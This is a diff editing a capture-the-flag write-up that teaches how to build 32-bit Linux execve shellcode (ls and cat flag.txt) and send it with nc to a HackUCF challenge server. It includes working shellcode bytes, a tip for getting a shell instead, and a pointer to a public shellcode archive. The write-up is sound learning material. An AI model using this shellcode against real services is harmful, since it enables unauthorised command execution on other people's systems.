@@ -14,9 +14,9 @@ nc ctf.hackucf.org 10103
 This write-up details some of my learning about shellcode. This means it gets pretty long and side-tracked from time to time.  
 The final shellcode performs `cat` on the file `flag.txt` on the server. You can just skip to the end and see what I did if you already know your shellcode.  
 Or you can get a shell on the server by looking at my `/bin/ls` example and changing the `ls` to `sh`.  
-If you want the quickest route to the flag, you can find existing shellcode solutions on-line and just use them. I tested one from http://shell-storm.org/shellcode/ (Linux/x86 - execve(/bin/bash. [/bin/sh, -p]NULL) - 33 bytes).  
+If you want the quickest route to the flag, you can find existing shellcode solutions on-line and just use them. I tested one from http://shell-storm.org/shellcode/ (I tried Linux/x86 - execve(/bin/bash. [/bin/sh, -p]NULL) - 33 bytes and it worked well). **Warning**: Malwarebytes doesn't like this site, but I think it's ok - lots of h4x0r's use it  
 **Note:** If you use `/bin/sh` against a server, you need to force the server to wait after executing your command, or it will return without you being able to use the shell. To do this, your command line should be:  
-`(python -c "print('&lt;your shellcode here&gt;')" ; cat) | nc ctf.hackucf.org 10103`
+`(python -c "print('<your shellcode here>')" ; cat) | nc ctf.hackucf.org 10103`
 
 This challenge requires some shellcode to solve. Running it on the server returns:
 ```
@@ -24,7 +24,7 @@ This challenge requires some shellcode to solve. Running it on the server return
 Send me shellcode, and I'll run it for you!
 ```
 
-I didn't know anything about shellcode before tacking this challenge. I didn't know anything about shellcode, so I used [this webpage](https://nobe4.fr/shellcode-for-by-newbie/) as a basis.
+I didn't know anything about shellcode before tackling this challenge, so I used [this webpage](https://nobe4.fr/shellcode-for-by-newbie/) as a basis for learning.
 
 First we create our test C program to run any shellcode locally to ensure it works:
 ```c
@@ -47,7 +47,7 @@ int main()
   return 0;
 }
 ```
-Now we can enter shellcode in the `shellcode` array and test it. The example in the webpage uses 4 `nop` instructions, so I tried that by editing the shellcode variable:
+Now we can enter shellcode in the `shellcode` array and test it. The example in the webpage above uses 4 `nop` instructions, so I tried that by editing the shellcode variable:
 ```c
 const char shellcode[] = "\x90\x90\x90\x90";
 ```
@@ -61,7 +61,7 @@ In the `main` function we can see our call to `shellcode`, and we can see that `
 
 ![Main with nop](main1.png)
 
-When I step through this code, our instruction pointer (`RIP`) does end up in our `nop` instruction.
+When I step through this code, our instruction pointer (`RIP`) does end up in our `nop` instructions.
 
 ![In our function](shellcode1.png)
 
@@ -118,7 +118,9 @@ Now we can start writing an assembly language file. We'll start with a 64-bit ve
 mov rax, 59   ; Set the system call number for execve()
 syscall       ; Run our execve()
 ```
-We now sidestep for a moment to try something else, writing a message to the screen. We need to make sure the message is in the .text section and not in the .data section so it can be encoded as part of our shellcode program. This is done by putting the string as part of a function. That function calls our main function, placing the return address on the stack. This means we can get the address of the data by popping from the stack. Here's a `Hello, world!` program testing that:
+We now sidestep for a moment to try something else, writing a message to the screen. This is so we can test accessing strings from within our shellcode. 
+
+We need to make sure the message is in the .text section and not in the .data section so it can be encoded as part of our shellcode program. This is done by putting the string as part of a function. That function calls our main function, placing the return address on the stack. This means we can get the address of the data by popping from the stack. Here's a `Hello, world!` program testing that:
 ```asm
 # Hello World test
          global _start
@@ -145,7 +147,7 @@ This was compiled and run with:
 > ./testbed 
 Hello, world!
 ```
-Now could we turn this into shellcode and run it in out C testbed? Let's look at an `objdump` or the code:
+Now could we turn this into shellcode and run it in our C testbed? Let's look at an `objdump` or the code:
 ```asm
 testbed:     file format elf64-x86-64
 
@@ -159,7 +161,7 @@ Disassembly of section .text:
   400082:	5e                   	pop    %rsi
   400083:	b8 01 00 00 00       	mov    $0x1,%eax   ; Note: These registers have been 
   400088:	bf 01 00 00 00       	mov    $0x1,%edi   ;       reduced from 64-bit (RAX, etc) to the
-  40008d:	ba 0e 00 00 00       	mov    $0xe,%edx   ;       32-bit versions (EAX, etc)
+  40008d:	ba 0e 00 00 00       	mov    $0xe,%edx   ;       32-bit versions (EAX, etc) by NASM
   400092:	0f 05                	syscall 
   400094:	b8 3c 00 00 00       	mov    $0x3c,%eax
   400099:	48 31 ff             	xor    %rdi,%rdi
@@ -176,10 +178,10 @@ Disassembly of section .text:
   4000ac:	72 6c                	jb     40011a <dataFunc+0x7c>
   4000ae:	64 21 0a             	and    %ecx,%fs:(%rdx)
 ```
-First we need to get rid of the zero bytes in the machine code. If the input to the challenge sees a zero,
-it will assume it is the end of the string an stop.
+First we need to get rid of the zero bytes in the machine code. If the in the challenge sees a zero,
+it will assume it is the end of the string and stop reading any further.
 
-For these moves it is relatively easy - just reduce the register to the 8-bit (LSB) versions. For `RAX/EAX` we can use `AL`, for `RDI/EDI` we can use `DIL` and for `RDX/EDX` we can use `DL`.
+For these `mov` instructions it is relatively easy - just reduce the register to the 8-bit (LSB) versions. For `RAX/EAX` we can use `AL`, for `RDI/EDI` we can use `DIL` and for `RDX/EDX` we can use `DL`.
 
 The new code is:
 ```asm
@@ -195,7 +197,7 @@ main:    pop rsi                       ; RSI needs to contain the message addres
          mov dil, 1                    ; Use stdout
          mov dl, 14                    ; Number of bytes
          syscall
-         mov al, 60                   ; Now exit
+         mov al, 60                    ; Now exit
          xor rdi, rdi                  ; with status 0
          syscall
          
@@ -233,23 +235,12 @@ Disassembly of section .text:
   4000a1:	72 6c                	jb     40010f <dataFunc+0x7c>
   4000a3:	64 21 0a             	and    %ecx,%fs:(%rdx)
 ```
-This now has no zeros in, and so we can convert it to `shellcode` and test it in our C program:
-```
-> objdump -s testbed
-
-testbed:     file format elf64-x86-64
-
-Contents of section .text:
- 400080 eb115eb0 0140b701 b20e0f05 b03c4831  ..^..@.......<H1
- 400090 ff0f05e8 eaffffff 48656c6c 6f2c2077  ........Hello, w
- 4000a0 6f726c64 210a                        orld!.
-```
-I used the following command (taken from [here]()) to convert the `objdump` to `shellcode`
+This now has no zeros in, and so we can convert it to shellcode and test it in our C program. I used the following command (taken from [here]()) to convert the `objdump` output to shellcode
 ```
 > objdump -d ./testbed|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xeb\x11\x5e\xb0\x01\x40\xb7\x01\xb2\x0e\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xea\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a"
 ```
-I pasted this into the `shellcode` variable in the C test program, compiled it and ran it. This didn't quite work - it hangs. The reason is that I now set the `AL` register to put my value in `RAX`, but I don't zero `RAX` first. The same is true of other registers. I updated the assembly to:
+I pasted the output the `shellcode` array in the C test program, compiled it and ran it. This didn't quite work - it hangs. The reason is that I now set the `AL` register to put my value in `RAX`, but I don't zero `RAX` first. The same is true of other registers. I updated the assembly to:
 ```asm
 # Hello World test
          global _start
@@ -273,14 +264,14 @@ main:    pop rsi                       ; RSI needs to contain the message addres
 dataFunc: call main
           db "Hello, world!", 10       ; Including new line
 ```
-I re-ran my objdump->shellcode one-liner, and copied the new code into the `shellcode` variable in `shellcode_test.c`. Now I ran the new code:
+I re-ran my objdump->shellcode one-liner, and copied the new code into the `shellcode` array in `shellcode_test.c`. Now I ran the new code:
 ```
 > ./shellcode-test 
 Hello, world!
 ```
 It works!
 
-OK. That was fun, but can we run it on the server? The answer was no. After some playing around, I found the server was running 32-bit executable, so, after some playing around, my revised Assembly language looked like this:
+OK. That was fun, but can we run it on the server? The answer was no. After some playing around, I found the server was running 32-bit executable, so, I revised my assembly language:
 ```asm
 # Hello World test
          global _start
@@ -305,7 +296,14 @@ dataFunc: call main
           db "Hello, world!", 10       ; Including new line
 
 ```
-The `shellcode` variable in the C test program was set to:
+Now to build that code we need to take the 64-bit option out of `nasm` and add a 32-bit option to `ld`:
+```
+> nasm -felf testbed.asm -o testbed.o && ld -m elf_i386 -o testbed testbed.o
+> ./testbed
+Hello, world!
+```
+
+Then I converted this new executable to shellcode and set the `shellcode` array in the C test program to:
 ```c
 const char shellcode[] = "\xeb\x15\x59\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a";
 ```
@@ -327,26 +325,26 @@ Hello, world!
 ```
 Yes, we can!
 
-Now, let's convert this to an ls on the server using `execve()` as we started earlier.
+Now, let's convert this to an `ls` on the server using `execve()` as we started earlier.
 For 32-bit `execve()`, the set up is:
 | Register | Contents|
 |----------|---------|
-| EAX      | system call number|
-| EBX      | Pointer to command Should be null terminated|
+| EAX      | System call number|
+| EBX      | Pointer to command - should be null terminated|
 | ECX      | Pointer to command (for argv - can include other args)|
 | EDX      | Evironment (envp) - usually zero|
 
-Because we need null terminated strings, it easier to move to using the push-pop method of storing the strings (see the [webpage](https://nobe4.fr/shellcode-for-by-newbie/) I used). This means we need to convert our `/bin/ls` into bytes we can push to the stack, where we can retrieve them for the appropriate variables:
+Because we need null terminated strings, it easier to move to using the push-pop method of storing the strings (see the [webpage](https://nobe4.fr/shellcode-for-by-newbie/) I used). This means we need to convert our `/bin/ls` into bytes we can push to the stack, where we can retrieve them for the appropriate registers:
 ```
 > python -c "print('/bin/ls'.encode('hex'))"
 2f62696e2f6c73
 ```
-This has only 7 bytes, and we need 4 per `push`, otherwise one of the bytes will be zero and will terminate the input at that point. Therefore, we add an extra slash to pad it out, which will make no difference to the command:
+This has only 7 bytes, and we need 4 per `push` (the total length of output from the above command needs to be a multiple of 8), otherwise one of the bytes will be zero and will terminate the input at that point. Therefore, we add an extra slash to pad it out, which will make no difference to the command:
 ```
 > python -c "print('/bin//ls'.encode('hex'))"
 2f62696e2f2f6c73
 ```
-So we need to push to the stack `0x6e69622f` and `0x736c2f2f`. Whatever is pushed last will be first popped, so we also need to reverse them.
+So we need to push to the stack `0x6e69622f` and `0x736c2f2f`. Whatever is pushed last will be popped first, so we also need to reverse these so that `0x736c2f2f` is pushed first.
 
 Now the assembly language becomes:
 ```asm
@@ -355,13 +353,13 @@ Now the assembly language becomes:
          section .text
 
 _start:  xor eax, eax               ; Start with EAX at 0
-         push eax                   ; The 0 terminator for our string
-         push 0x736c2f2f            ; Push the executable string to the stack
+         push eax                   ; The null terminator for our string
+         push 0x736c2f2f            ; Push the executable string (bin/ls) to the stack
          push 0x6e69622f            ;
          mov ebx, esp               ; Set EBX so it points to the command
       
          ; The argv list is a list of pointers to strings
-         ; ECX points at the start of this list and it is
+         ; ECX points at the start of this list and the list is
          ; NULL terminated
          push eax                   ; Null terminate our argv list
          push ebx                   ; First and only argv (the command)
@@ -377,7 +375,7 @@ _start:  xor eax, eax               ; Start with EAX at 0
          xor ebx, ebx                ; with status 0
          int 0x80
 ```
-I build this and ran it:
+I built this and ran it:
 ```
 > nasm -felf ls-shellcode.asm -o ls-shellcode.o && ld -m elf_i386 -o ls-shellcode ls-shellcode.o
 > ./ls-shellcode 
@@ -391,7 +389,7 @@ Then I turned it into shellcode:
 objdump -d ./ls-shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
 ```
-and put it in the `shellcode` variable in our testbed, compiled and ran it:
+and put it in the `shellcode` array in our C testbed, compiled it and ran it:
 ```
 > gcc -m32 shellcode-test.c -o shellcode-test
 > ./shellcode-test 
@@ -408,7 +406,9 @@ Running shellcode!
 flag.txt
 gimmeshellcode
 ```
-Great! We can see that there's a file named flag.txt there. Let's write one more shellcode to `cat` that file (it'll give us the chance to test `execve()` with multiple arguments).
+Great! We can see that there's a file named `flag.txt` there. 
+
+Let's write one more shellcode example to `cat` that file (it'll give us the chance to test `execve()` with multiple arguments in `argv`).
 
 First we need bytes for the strings `/bin/cat` and `flag.txt`
 ```
@@ -417,7 +417,7 @@ First we need bytes for the strings `/bin/cat` and `flag.txt`
 > python -c "print('flag.txt'.encode('hex'))"
 666c61672e747874
 ```
-Both are the right length, so we don't need padding. This time, `/bin/cat` will need `0x6e69622f` and `0x7461632f`, and `flag.txt` will need `0x67616c66` and `0x7478742e`.
+Both are the right length, so we don't need padding. `/bin/cat` will need `0x6e69622f` and `0x7461632f`, and `flag.txt` will need `0x67616c66` and `0x7478742e`.
 
 Here's the assembly I wrote to do the `cat`:
 ```asm
@@ -426,18 +426,18 @@ Here's the assembly I wrote to do the `cat`:
          section .text
 
 _start:  xor eax, eax               ; Start with EAX at 0
-         push eax                   ; The 0 terminator for our string
+         push eax                   ; The null terminator for our string
          push 0x7461632f            ; Push the executable string (/bin/cat) to the stack
          push 0x6e69622f            ;
          mov ebx, esp               ; Set EBX so it points to the command
 
          push eax                   ; Null terminate the argument string
-         push 0x7478742e            ; Push the argument (flag.tx) to the stack
+         push 0x7478742e            ; Push the argument (flag.txt) to the stack
          push 0x67616c66            ;
          mov esi, esp               ; Save the pointer in ESI
       
          ; The argv list is a list of pointers to strings
-         ; ECX points at the start of this list and it is
+         ; ECX points at the start of this list and the list is
          ; NULL terminated
          push eax                   ; Null terminate our argv list
          push esi                   ; Push the pointer to the argument (flag.txt)
@@ -466,9 +466,9 @@ End of transmission...
 ```
 This listed out my local flag.txt file. Now it is converted to shellcode and tested on the server:
 ```
-> objdump -d ./cat-shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe6\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
-> python -c "print ('\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe6\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80')" | nc ctf.hackucf.org 10103
+> SCODE=$(objdump -d ./cat-shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
+> SCODE=$(echo $SCODE | sed -e 's/\"//g')
+> python -c "print ('$SCODE')" | nc ctf.hackucf.org 10103
 Send me shellcode, and I'll run it for you!
 Running shellcode!
 flag{...}
